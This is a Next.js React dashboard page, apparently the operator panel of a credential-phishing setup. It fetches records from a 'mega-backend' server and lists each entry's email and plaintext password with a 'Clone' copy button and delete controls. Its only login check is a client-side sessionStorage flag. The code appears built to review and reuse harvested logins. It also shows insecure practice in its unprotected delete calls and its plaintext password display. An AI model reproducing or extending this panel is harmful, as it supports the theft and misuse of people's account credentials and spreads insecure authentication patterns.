'use client';
import axios from 'axios';
import React, { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';

const Page = () => {
    const [selectedIds, setSelectedIds] = useState([]);
    const [filter, setFilter] = useState('');
    const [formData, setFormData] = useState([]);
    const [itemCount, setItemCount] = useState(0);
    const [loading, setLoading] = useState(false); // Add loading state

    const fetchData = async (filter) => {
        setLoading(true); // Set loading to true before fetching
        try {
            const response = await axios.get('https://mega-backend-4k8t.onrender.com/api/data', {
                params: { filter },
            });
            const sortedData = response.data.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
            setFormData(sortedData);
            setItemCount(sortedData.length);
        } catch (error) {
            console.error("Error fetching data:", error); // Handle errors if necessary
        } finally {
            setLoading(false); // Set loading to false after fetching
        }
    };

    useEffect(() => {
        fetchData(filter);
    }, [filter]);

    const handleDelete = async (id) => {
        await axios.delete(`https://mega-backend-4k8t.onrender.com/api/delete/${id}`);
        fetchData(filter); // Refresh the data on the dashboard
    };

    const handleCopy = (email, password) => {
        navigator.clipboard.writeText(`Email: ${email}, Password: ${password}`);
        alert('Copied to clipboard');
    };

    const toggleSelectAll = (e) => {
        if (e.target.checked) {
            const allIds = formData.map((data) => data._id);
            setSelectedIds(allIds);
        } else {
            setSelectedIds([]);
        }
    };

    const handleCheckboxChange = (id) => {
        if (selectedIds.includes(id)) {
            setSelectedIds(selectedIds.filter((selectedId) => selectedId !== id));
        } else {
            setSelectedIds([...selectedIds, id]);
        }
    };

    const handleDeleteAll = async () => {
        for (let id of selectedIds) {
            await axios.delete(`https://mega-backend-4k8t.onrender.com/api/delete/${id}`);
        }
        fetchData(filter);
        setSelectedIds([]);
    };

    const router = useRouter();

    useEffect(() => {
        if (sessionStorage.getItem('isLoggedIn') !== 'true') {
            router.push('/Admin_Login');
        }
    }, [router]);

    return (
        <div className='p-5'>
            <section className='flex items-center justify-between px-2'>
                <div className='flex items-center justify-center gap-3'>
                    <h2 className='text-[20px] font-bold'>Dashboard</h2>
                    {selectedIds.length === formData.length && formData.length > 0 && (
                        <button onClick={handleDeleteAll} className='px-2 text-white bg-gray-700 rounded'>
                            Delete All
                        </button>
                    )}
                </div>

                {selectedIds.length !== formData.length && formData.length > 0 && (
                    <span className='ml-2 font-semibold'>{itemCount} Users</span>
                )}
                <div>
                    <select className='p-2 outline-none text-[14px]' value={filter} onChange={(e) => setFilter(e.target.value)}>
                        <option value="">All</option>
                        <option value="today">Today</option>
                        <option value="week">This Week</option>
                        <option value="month">This Month</option>
                    </select>
                </div>
            </section>

            {loading ? ( // Show loading indicator
                <div className="text-center">Loading...</div>
            ) : (
                <div className="flex flex-col p-2">
                    <div className="-m-1.5 overflow-x-auto">
                        <div className="p-1.5 min-w-full inline-block align-middle">
                            <div className="border divide-y divide-gray-200 rounded-lg dark:border-gray-700 dark:divide-gray-700">
                                <div className="overflow-hidden">
                                    <table className="min-w-full divide-y divide-gray-200 dark:divide-gray-700">
                                        <thead className="bg-gray-50 dark:bg-gray-700">
                                            <tr>
                                                <th scope="col" className="px-4 py-3 pe-0">
                                                    <div className="flex items-center h-5">
                                                        <input id="hs-table-pagination-checkbox-all" type="checkbox" onChange={toggleSelectAll} checked={selectedIds.length === formData.length && formData.length > 0} className="text-blue-600 border-gray-200 rounded focus:ring-blue-500 dark:bg-gray-800 dark:border-gray-700 dark:checked:bg-blue-500 dark:checked:border-blue-500 dark:focus:ring-offset-gray-800"/>
                                                        <label htmlFor="hs-table-pagination-checkbox-all" className="sr-only">Checkbox</label>
                                                    </div>
                                                </th>
                                                <th scope="col" className="px-6 py-3 text-xs font-medium text-white uppercase text-start">Email & Password</th>
                                                <th scope="col" className="px-6 py-3 text-xs font-medium text-white uppercase text-end">
                                                    <span className='px-[40px]'>Copy</span>
                                                    <span className='px-7'>Delete</span>
                                                </th>
                                            </tr>
                                        </thead>
                                        <tbody className="divide-y divide-gray-200 dark:divide-gray-700">
                                            {formData.length === 0 ? (
                                                <tr>
                                                    <td colSpan="4" style={{ textAlign: 'center', padding: '20px' }}>
                                                        No data available
                                                    </td>
                                                </tr>
                                            ) : (
                                                formData.map((data) => (
                                                    <tr key={data._id}>
                                                        <td className="py-3 ps-4">
                                                            <div className="flex items-center h-5">
                                                                <input id={`hs-table-pagination-checkbox-${data._id}`} type="checkbox" checked={selectedIds.includes(data._id)} onChange={() => handleCheckboxChange(data._id)} className="text-blue-600 border-gray-200 rounded focus:ring-blue-500 dark:bg-gray-800 dark:border-gray-700 dark:checked:bg-blue-500 dark:checked:border-blue-500 dark:focus:ring-offset-gray-800"/>
                                                                <label htmlFor={`hs-table-pagination-checkbox-${data._id}`} className="sr-only">Checkbox</label>
                                                            </div>
                                                        </td>
                                                        <td className="px-6 py-4 text-sm text-black whitespace-nowrap ">
                                                            <span>Email : {data.email}</span> <br />
                                                            <span>Password : {data.password}</span>
                                                        </td>
                                                        <td className="px-6 py-4 text-sm text-black whitespace-nowrap text-end">
                                                            <span onClick={() => handleCopy(data.email, data.password)} className='px-10 cursor-pointer'>Clone</span>
                                                            <span onClick={() => handleDelete(data._id)} className='px-10 cursor-pointer'>❌</span>
                                                        </td>
                                                    </tr>
                                                ))
                                            )}
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
};

export default Page;
